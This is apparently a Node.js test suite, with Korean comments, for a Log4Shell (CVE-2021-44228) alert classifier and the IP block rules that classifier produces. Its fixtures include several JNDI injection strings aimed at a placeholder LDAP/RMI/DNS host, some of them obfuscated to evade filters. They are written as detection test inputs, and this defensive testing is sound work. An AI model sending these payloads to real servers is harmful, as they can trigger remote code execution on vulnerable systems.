import assert from 'node:assert/strict';
import { copyFile, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { createAuthApi } from '../src/auth-api.mjs';
import { createNotesApi } from '../src/notes-api.mjs';
import { KNOWN_CVE_RULES_FILE, findBlock, loadBlockRules } from '../src/xdr-block.mjs';
import * as decideModule from '../xdr/known-cve/decide.mjs';
import { decide } from '../xdr/known-cve/decide.mjs';
import { alertLine, buildBlockRules, decideAll, respond } from '../xdr/known-cve/respond.mjs';
import { readAlerts, scrub } from '../xdr/known-cve/read-alerts.mjs';

const fixture = JSON.parse(await readFile(new URL('../xdr/fixtures/known-cve.json', import.meta.url), 'utf8'));
const patternsFile = JSON.parse(await readFile(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8'));
const decideSource = await readFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url), 'utf8');

// 경보 묶음 설명(조회 구문이 있다 / 글자만 있다 / 정상 조회)을 읽고 나눈 기대 값입니다. 정답표가 아닙니다.
const ids = (from, to) => Array.from({ length: to - from + 1 }, (_, i) => `kc-${String(from + i).padStart(2, '0')}`);
const CLEAR = ids(1, 8);
const AMBIGUOUS = ids(9, 16);
const NORMAL = ids(17, 24);
const byId = (id) => fixture.alerts.find((a) => a.id === id);
const ipsOf = (list) => new Set(list.map((id) => byId(id).data.srcip));
const NOW = Date.parse('2026-10-18T00:00:00Z');
const mk = (data, level = 3, description = '시험') => ({ id: 'kc-x', rule: { level, description }, data: { srcip: '192.0.2.200', ...data } });

test('경보 건수와 뽑은 줄 수가 같고, 비밀값처럼 보이는 값은 가려진다', async () => {
  const { alertCount, rows } = await readAlerts();
  assert.equal(alertCount, 24);
  assert.equal(rows.length, alertCount);
  assert.ok(rows.every((r) => JSON.stringify(Object.keys(r)) === JSON.stringify(['time', 'srcip', 'user', 'level', 'description'])));
  assert.equal(scrub('password=abc12345 and sb_secret_abcdefghijklmnop'), '[가림] and [가림]');
});

test('패턴마다 이름·찾는 조건·근거 한 줄이 있고, decide.mjs 맨 위 상수와 같다', () => {
  assert.equal(patternsFile.patterns.length, 3);
  for (const p of patternsFile.patterns) {
    assert.ok(p.name && p.condition && p.mitre === 'T1190');
    assert.match(p.evidence, /^근거: .+/u);
    assert.ok(!p.evidence.includes('\n'));
  }
  // PATTERNS 는 내보내지 않으므로 파일 맨 위 상수를 글자로 읽어 patterns.json 과 비교합니다.
  const literal = /const PATTERNS = Object\.freeze\((\[[\s\S]*?\n\])\);/u.exec(decideSource)?.[1];
  assert.ok(literal);
  assert.deepEqual(JSON.parse(literal), patternsFile.patterns);
  assert.deepEqual(Object.keys(decideModule), ['decide']);
});

test('decide.mjs 는 import 문도 파일·네트워크 사용도 없고, 한 파일만 따로 불러와도 답한다', async () => {
  assert.ok(!/^\s*import\s/mu.test(decideSource));
  assert.ok(!/\bimport\s*\(|\brequire\s*\(|node:|\bfetch\s*\(|readFile|writeFile|process\./u.test(decideSource));
  const dir = await mkdtemp(join(tmpdir(), 'kc-decide-'));
  try {
    await copyFile(new URL('../xdr/known-cve/decide.mjs', import.meta.url), join(dir, 'decide.mjs'));
    const alone = await import(join(dir, 'decide.mjs'));
    assert.equal(alone.decide(byId('kc-01')).action, 'block');
    assert.equal(alone.decide(byId('kc-17')).action, 'record');
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('명확한 공격 block, 애매한 건 alert, 정상은 record, 형식과 임계값을 지킨다', () => {
  for (const alert of fixture.alerts) {
    const d = decide(alert);
    assert.deepEqual(Object.keys(d).sort(), ['action', 'confidence', 'reason']);
    assert.ok(Number.isFinite(d.confidence) && d.confidence >= 0 && d.confidence <= 1);
    assert.ok(d.reason && !d.reason.includes('\n'));
    const expected = d.confidence >= 0.85 ? 'block' : d.confidence >= 0.5 ? 'alert' : 'record';
    assert.equal(d.action, expected, alert.id);
  }
  for (const id of CLEAR) assert.equal(decide(byId(id)).action, 'block', id);
  for (const id of AMBIGUOUS) assert.equal(decide(byId(id)).action, 'alert', id);
  for (const id of NORMAL) assert.equal(decide(byId(id)).action, 'record', id);
  assert.match(decide(byId('kc-01')).reason, /jndi-lookup-in-header/u);
  assert.match(decide(byId('kc-02')).reason, /jndi-lookup-in-request-args/u);
  assert.match(decide(byId('kc-05')).reason, /vuln-scanner-trace-with-lookup/u);
});

test('다른 모양의 경보: 인코딩·다른 칸·깊은 칸·쪼갠 표기는 block, 조각이나 단어만은 alert, 이상한 입력은 오류 없이 답한다', () => {
  const blocked = [
    mk({ url: '/a?q=%24%7Bjndi:ldap://192.0.2.9/x%7D' }),
    mk({ referer: '${jndi:rmi://192.0.2.9/x}' }),
    mk({ headers: { 'x-api-version': '${JNDI:dns://192.0.2.9/x}' } }),
    mk({ useragent: '${${lower:j}ndi:ldap://192.0.2.9/x}' }),
    mk({ useragent: '${${::-j}${::-n}${::-d}${::-i}:ldap://192.0.2.9/x}' }),
    mk({ url: '/a?q=${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://192.0.2.9/x}' }),
    mk({ url: '/a?q=%24%7B%24%7Blower:j%7Dndi:ldap://192.0.2.9/x%7D' }),
  ];
  for (const a of blocked) assert.equal(decide(a).action, 'block', JSON.stringify(a.data));
  assert.match(decide(blocked[3]).reason, /쪼갠 표기/u);
  const alerts = [
    mk({ url: '/a?q=${jndi:}' }),
    mk({ url: '/a?q=${${lower:j}ndi:}' }),
    mk({ url: '/a?q=jndi' }),
    mk({ useragent: 'CVE-2021-44228 notes' }),
  ];
  for (const a of alerts) {
    const d = decide(a);
    assert.equal(d.action, 'alert', JSON.stringify(a.data));
    assert.ok(d.confidence < 0.85);
  }
  // 설명문에만 구문이 적혀 있으면 막지 않는다.
  assert.notEqual(decide(mk({ url: '/' }, 3, '설명에 ${jndi:ldap://192.0.2.9/x} 가 적혀 있음')).action, 'block');
  // 어느 칸이든 완전한 구문이면 block 이지만, 주소가 아닌 값은 규칙이 되지 않는다.
  const weird = mk({ srcip: '${jndi:ldap://192.0.2.9/x}' });
  assert.equal(decide(weird).action, 'block');
  assert.equal(buildBlockRules({ alerts: [weird], decisions: decideAll([weird]), now: NOW }).length, 0);
  for (const odd of [null, undefined, 0, 'x', [], {}, { data: 'x' }, { data: null }, { rule: { level: 'a' }, data: { a: { b: 1 } } }, { data: { url: 'a'.repeat(50000) } }]) {
    const d = decide(odd);
    assert.ok(['block', 'alert', 'record'].includes(d.action));
  }
  const cyc = { data: {} }; cyc.data.self = cyc;
  assert.ok(['block', 'alert', 'record'].includes(decide(cyc).action));
});

test('연결: 규칙에는 만료 시각·근거 경보 번호가 붙은 공격 주소만 들어가고, 정상 사용자와 겹치는 주소는 빠진다', () => {
  const decisions = decideAll(fixture.alerts);
  const rules = buildBlockRules({ alerts: fixture.alerts, decisions, now: NOW });
  assert.equal(rules.length, 7);
  for (const r of rules) {
    assert.equal(r.ruleId, 'xdr.kc.deny-ip');
    assert.equal(r.decision, 'deny');
    assert.ok(CLEAR.includes(r.evidenceAlertId));
    assert.equal(byId(r.evidenceAlertId).data.srcip, r.srcip);
    assert.equal(Date.parse(r.expiresAt) - Date.parse(r.createdAt), 3600000);
  }
  const blocked = new Set(rules.map((r) => r.srcip));
  for (const ip of [...ipsOf(NORMAL), ...ipsOf(AMBIGUOUS)]) assert.ok(!blocked.has(ip), ip);
  // 같은 주소가 정상 이벤트에도 나오면 빠진다.
  const shared = [byId('kc-01'), { ...byId('kc-17'), id: 'kc-97', data: { ...byId('kc-17').data, srcip: byId('kc-01').data.srcip } }];
  assert.equal(buildBlockRules({ alerts: shared, decisions: decideAll(shared), now: NOW }).length, 0);
  // 주소가 아닌 값은 규칙이 되지 않는다.
  const bad = [{ ...byId('kc-01'), data: { ...byId('kc-01').data, srcip: 'not-an-ip' } }];
  assert.equal(buildBlockRules({ alerts: bad, decisions: decideAll(bad), now: NOW }).length, 0);
});

async function temp(run) {
  const dir = await mkdtemp(join(tmpdir(), 'kc-respond-'));
  try {
    await mkdir(join(dir, 'xdr', 'fixtures'), { recursive: true });
    await copyFile(new URL('../xdr/fixtures/known-cve.json', import.meta.url), join(dir, 'xdr', 'fixtures', 'known-cve.json'));
    return await run({ dir, rulesFile: join(dir, 'block-rules.json'), logFile: join(dir, 'alerts.log') });
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
}

test('연결: 규칙 파일과 알림 로그가 만들어지고(block·alert 만 한 줄씩), 다시 흘리면 로그가 이어진다', async () => {
  await temp(async ({ dir, rulesFile, logFile }) => {
    const first = await respond({ root: dir, now: NOW, rulesFile, logFile });
    assert.equal(first.rules.length, 7);
    assert.equal(first.logged, 16);
    const file = JSON.parse(await readFile(rulesFile, 'utf8'));
    assert.equal(file.schema, 'aleph.xdr.block-rules.v1');
    assert.deepEqual(file.rules, first.rules);
    const log = (await readFile(logFile, 'utf8')).trimEnd().split('\n');
    assert.equal(log.filter((l) => / BLOCK /u.test(l)).length, 8);
    assert.equal(log.filter((l) => / ALERT /u.test(l)).length, 8);
    assert.ok(!log.some((l) => / RECORD /u.test(l)));
    assert.ok(log.every((l) => /^\d{4}-\d\d-\d\dT[\d:.]+Z (?:BLOCK|ALERT) kc-\d\d \S+ \S+ [\d.]+ \S/u.test(l)));
    await respond({ root: dir, now: NOW + 1000, rulesFile, logFile });
    assert.equal((await readFile(logFile, 'utf8')).trimEnd().split('\n').length, 32);
    assert.equal(JSON.parse(await readFile(rulesFile, 'utf8')).rules.length, 7);
  });
  assert.ok(!alertLine({ action: 'block', alertId: 'kc-x', confidence: 0.9, reason: 'a\nb password=secret99' }, { data: {} }).includes('\n'));
  assert.ok(!alertLine({ action: 'block', alertId: 'kc-x', confidence: 0.9, reason: 'password=secret99' }, { data: {} }).includes('secret99'));
});

test('연결: 경보 묶음 형식이 아니면 안내 문구로 멈추고 규칙·로그를 만들지 않는다', async () => {
  await temp(async ({ dir, rulesFile, logFile }) => {
    await writeFile(join(dir, 'xdr', 'fixtures', 'known-cve.json'), JSON.stringify({ schema: 'x', alerts: [] }));
    await assert.rejects(respond({ root: dir, rulesFile, logFile }), /형식이 아닙니다/u);
    await assert.rejects(readFile(rulesFile));
    await assert.rejects(readFile(logFile));
  });
});

const callAuth = (rulesList, ip, calls) => createAuthApi({
  getSettings: () => ({ url: 'https://example.invalid', secretKey: 'x' }),
  fetchImpl: async () => { calls.n += 1; return { ok: false, status: 400, json: async () => ({ error_code: 'invalid_credentials' }) }; },
  getBlockRules: () => rulesList,
  now: () => NOW,
}).login({ method: 'POST', headers: { 'x-forwarded-for': ip }, body: { email: 'a@b.co', password: 'pw' } }, {
  setHeader() {},
  status(code) { return { json: (body) => ({ code, body }) }; },
});

const callNotes = async (rulesList, ip) => {
  const api = createNotesApi({ getVerifier: () => async () => null, getSupabase: () => ({}), getBlockRules: () => rulesList, now: () => NOW });
  let out;
  await api.collection({ method: 'GET', headers: { 'x-forwarded-for': ip } }, {
    setHeader() {},
    status(code) { return { json: (body) => { out = { code, body }; } }; },
  });
  return out;
};

test('경보를 다시 흘리면: 공격 주소는 로그인·자료 API 에서 403, 정상·애매한 주소는 기존대로 통과', async () => {
  await temp(async ({ dir, rulesFile, logFile }) => {
    await respond({ root: dir, now: Date.now(), rulesFile, logFile });
    const live = loadBlockRules(rulesFile);
    assert.equal(live.length, 7);
    const calls = { n: 0 };
    for (const ip of ipsOf(CLEAR)) {
      assert.equal((await callAuth(live, ip, calls)).code, 403, `로그인 ${ip}`);
      assert.deepEqual((await callAuth(live, ip, calls)).body, { error: 'BLOCKED_BY_XDR' });
      assert.equal((await callNotes(live, ip)).code, 403, `자료 ${ip}`);
    }
    assert.equal(calls.n, 0);
    for (const ip of [...ipsOf(NORMAL), ...ipsOf(AMBIGUOUS)]) {
      assert.equal((await callAuth(live, ip, calls)).code, 401, `로그인 ${ip}`);
      assert.equal((await callNotes(live, ip)).code, 401, `자료 ${ip}`);
    }
    assert.equal(calls.n, ipsOf(NORMAL).size + ipsOf(AMBIGUOUS).size);
  });
});

test('ZTNA 거부 규칙 읽기: 기본 경로에 known-cve 규칙 파일도 함께 읽고, 만료된 규칙은 막지 않는다', async () => {
  let original = null;
  try { original = await readFile(KNOWN_CVE_RULES_FILE, 'utf8'); } catch { /* 없음 */ }
  const probe = { ruleId: 'xdr.kc.deny-ip', decision: 'deny', srcip: '198.51.100.251', evidenceAlertId: 'kc-01', createdAt: new Date(NOW).toISOString(), expiresAt: new Date(NOW + 3600000).toISOString() };
  try {
    await writeFile(KNOWN_CVE_RULES_FILE, JSON.stringify({ schema: 'aleph.xdr.block-rules.v1', rules: [probe] }));
    const found = loadBlockRules();
    assert.equal(findBlock(found, '198.51.100.251', NOW)?.evidenceAlertId, 'kc-01');
    assert.equal(findBlock(found, '198.51.100.251', NOW + 3600001), null);
    assert.equal(findBlock(found, '198.51.100.252', NOW), null);
  } finally {
    if (original === null) await rm(KNOWN_CVE_RULES_FILE, { force: true });
    else await writeFile(KNOWN_CVE_RULES_FILE, original);
  }
});
